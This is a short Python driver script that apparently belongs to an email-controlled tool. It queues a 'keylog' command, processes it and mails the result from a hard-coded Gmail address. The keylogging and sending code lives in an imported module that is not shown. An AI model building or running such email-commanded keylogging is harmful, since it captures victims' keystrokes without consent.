from classMail import *


def main():
    mail = Mail()
    mail.loop()

def test_main():
    mail = Mail()
    mail.cmd_list = ["keylog"]
    mail.process_command() 
    mail.sender = "17mels22@gmail.com"
    mail.send_mail()

if __name__ == "__main__":
    test_main()
    # main()
